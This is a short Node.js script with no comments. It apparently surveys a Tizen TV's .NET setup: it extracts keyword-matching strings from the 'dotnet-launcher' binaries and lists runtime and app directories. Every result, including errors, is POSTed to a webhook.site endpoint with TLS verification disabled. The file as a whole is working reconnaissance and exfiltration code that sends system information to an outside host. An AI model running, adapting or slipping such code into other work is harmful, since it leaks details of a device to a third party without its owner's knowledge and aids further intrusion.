var fs = require('fs');
var https = require('https');
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/49eca885-643e-4d14-a1d1-c284408e4033/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function strings(file, max) {
    try {
        var b = fs.readFileSync(file);
        var s = b.toString('latin1');
        var re = /[\x20-\x7e]{4,}/g;
        var out = [];
        var m;
        while ((m = re.exec(s)) && out.length < max) {
            if (/dll|DLL|Usage|usage|app|App|--|inhouse|loader|assembly|runtime|corerun|launch/.test(m[0])) {
                out.push(m[0]);
            }
        }
        send('launcher', file + ' strings:\n' + out.join('\n'));
    } catch (e) {
        send('launcher', file + ' ERR ' + e);
    }
}
strings('/usr/bin/dotnet-launcher', 120);
strings('/usr/bin/dotnet-launcher-inhouse', 120);
['/opt/dotnet', '/opt/dotnet/runtime', '/usr/share/dotnet', '/usr/share/dotnet/shared', '/usr/share/dotnet/shared/Microsoft.NETCore.App', '/usr/share/dotnet/shared/Microsoft.NETCore.App/2.1.4', '/usr/share/dotnet_org', '/usr/share/dotnet.tizen', '/usr/apps/csapi-tv-tizenfx'].forEach(function (d) {
    try {
        send('launcher', d + ': ' + fs.readdirSync(d).join(','));
    } catch (e) {
        send('launcher', d + ' ERR ' + e);
    }
});
